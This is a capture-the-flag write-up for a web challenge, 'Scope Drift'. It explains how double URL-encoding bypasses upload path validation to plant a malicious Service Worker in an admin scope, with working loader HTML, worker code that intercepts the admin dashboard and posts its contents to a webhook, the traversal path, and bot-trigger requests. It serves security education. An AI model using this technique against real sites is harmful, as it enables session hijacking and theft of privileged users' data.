# Scope Drift

> **Category**: Web
>
> **Flag**: `d3ctf{d0uble_url_dec0de_sw_sc0pe_dr1ft_pwned}`

### Summary

**Scope Drift** is a Web challenge centered around path normalization discrepancies between an HTTP upload handler and a static file server. By exploiting double URL-encoding, an attacker can bypass upload path validation checks to write an attacker-controlled Service Worker script into a restricted `/u/admin/` scope, intercepting admin requests and exfiltrating the flag.

***

### Technical Details & Vulnerability Analysis

The application enforces path validation to prevent users from writing files outside their allocated guest directory (`/u/guest/`). However, a discrepancy exists between how the upload handler and the static file server handle URL decoding and normalization:

1. **Upload Validation Handler**: Decodes the path **once**: $$\text{Input: } \texttt{/u/guest/\%252e\%252e/admin/sw.js} \xrightarrow{\text{Decode 1x}} \texttt{/u/guest/\%2e\%2e/admin/sw.js}$$ Since the string still starts with `/u/guest/`, the directory validation check passes.
2. **Static File Server**: Decodes the path **twice** and normalizes `../`: $$\text{Path: } \texttt{/u/guest/\%2e\%2e/admin/sw.js} \xrightarrow{\text{Decode + Normalize}} \texttt{/u/admin/sw.js}$$
3.  **Service Worker Scope Enforcement**: When serving `/u/admin/sw.js`, the server returns the header:

    ```http
    Service-Worker-Allowed: /u/admin/
    ```

    This allows an attacker to register a Service Worker controlling the `/u/admin/` scope.

***

### Walkthrough & Solution Steps

#### Step 1: Craft the Malicious HTML Loader Page

First, upload an HTML page to `/u/guest/index.html`. This page registers the malicious Service Worker within the `/u/admin/` scope and then redirects the victim (admin bot) to the admin dashboard:

```html
<!-- /u/guest/index.html -->
<script>
(async () => {
    // Register the malicious Service Worker under /u/admin/ scope
    await navigator.serviceWorker.register(
        '/u/admin/sw.js?cb=' + Date.now(),
        {
            scope: '/u/admin/',
            updateViaCache: 'none'
        }
    );
    await navigator.serviceWorker.ready;
    // Redirect to the target admin page
    location.href = '/u/admin/dashboard';
})();
</script>
```

#### Step 2: Upload the Malicious Service Worker Script

Upload the Service Worker script using the double-encoded traversal path (`/u/guest/%252e%252e/admin/sw.js`):

```javascript
// Service Worker: /u/admin/sw.js
self.addEventListener('install', () => {
    self.skipWaiting();
});

self.addEventListener('activate', event => {
    event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    if (url.pathname !== '/u/admin/dashboard') return;

    event.respondWith((async () => {
        // Intercept dashboard request
        const response = await fetch(event.request);
        const body = await response.clone().text();
        
        // Exfiltrate HTML body containing the flag to guest webhook
        await fetch('/webhook/guest', {
            method: 'POST',
            keepalive: true,
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ body })
        }).catch(() => {});

        return response;
    })());
});
```

#### Step 3: Trigger the Admin Bot & Retrieve Flag

Submit the guest URL to the admin bot:

```http
GET /bot?url=http://host/u/guest/index.html
```

When the admin bot opens the page:

1. The Service Worker is registered with scope `/u/admin/`.
2. The bot navigates to `/u/admin/dashboard`.
3. The Service Worker intercepts the dashboard request and posts the response body to `/webhook/guest`.

Finally, retrieve the exfiltrated flag from the inbox:

```http
GET /inbox
```

***

### Flag

```
d3ctf{d0uble_url_dec0de_sw_sc0pe_dr1ft_pwned}
```
